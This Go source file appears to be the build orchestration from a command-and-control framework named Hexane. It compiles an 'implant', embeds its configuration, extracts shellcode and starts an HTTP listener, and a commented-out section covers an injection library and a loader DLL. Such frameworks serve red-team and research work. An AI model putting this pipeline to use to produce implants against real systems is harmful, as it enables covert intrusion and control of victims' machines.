package core

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
	"time"
)

var (
	BuildPath   = path.Join(RootDirectory, "build")
	ConfigsPath = path.Join(RootDirectory, "configs")
	CorePath    = path.Join(RootDirectory, "core")
	LogsPath    = path.Join(RootDirectory, "logs")
	LoaderPath  = path.Join(RootDirectory, "loader")
	ImplantPath = path.Join(RootDirectory, "implant")
	HashHeader  = path.Join(CorePath, "include/names.hpp")
	HashStrings = path.Join(ConfigsPath, "strings.txt")
)

func (h *HexaneConfig) BuildModule(builder *Builder) error {
	var err error

	if builder.RootDirectory == "" {
		return fmt.Errorf("source directory is required")
	}

	if builder.OutputName == "" {
		return fmt.Errorf("output name is required")
	}

	if builder.Linker != "" {
		builder.Linker = filepath.Join(builder.RootDirectory, builder.Linker)
	}

	if err = h.BuildSources(builder); err != nil {
		return err
	}

	if builder.Objects.Dependencies != nil {
		builder.Objects.Components = append(builder.Objects.Components, builder.Objects.Dependencies...)
	}

	if len(builder.Objects.Components) > 1 {
		return h.ExecuteBuildType(builder)
	} else {
		builder.OutputName = builder.Objects.Components[0]
		return nil
	}
}

func (h *HexaneConfig) RunBuild() error {
	var (
		err    error
		module *Object
	)

	WrapMessage("DBG", "creating payload directory")
	if err = os.MkdirAll(h.CompilerCFG.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("DBG", "generating config")
	if err = h.GenerateConfigBytes(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	WrapMessage("DBG", "generating implant\n")
	if module, err = GetModuleConfig(path.Join(CorePath, "implant.json")); err != nil {
		return err
	}
	if err = h.BuildModule(module); err != nil {
		return err
	}

	WrapMessage("DBG", "embedding implant config data")
	if err = h.EmbedSectionData(BuildPath+"/implant.exe", ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	WrapMessage("DBG", "extracting shellcode")
	if err = h.CopySectionData(BuildPath+"/implant.exe", path.Join(h.CompilerCFG.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	/*
		if h.ImplantCFG.Injection != nil {

			WrapMessage("DBG", "generating injectlib\n")
			if err = h.BuildModule(h.ImplantCFG.Injection.Object); err != nil {
				return err
			}

			WrapMessage("DBG", "embedding injectlib config")
			if err = h.EmbedSectionData(path.Join(h.CompilerCFG.BuildDirectory, h.ImplantCFG.Injection.Object.OutputName), ".text$F", h.ConfigBytes); err != nil {
				return err
			}

			WrapMessage("DBG", "generating loader dll")
			if module, err = GetModuleConfig(path.Join(LoaderPath, "loader.json")); err != nil {
				return err
			}
			if err = h.BuildModule(module); err != nil {
				return err
			}
		}
	*/

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", module.ObjectName))

	return nil
}
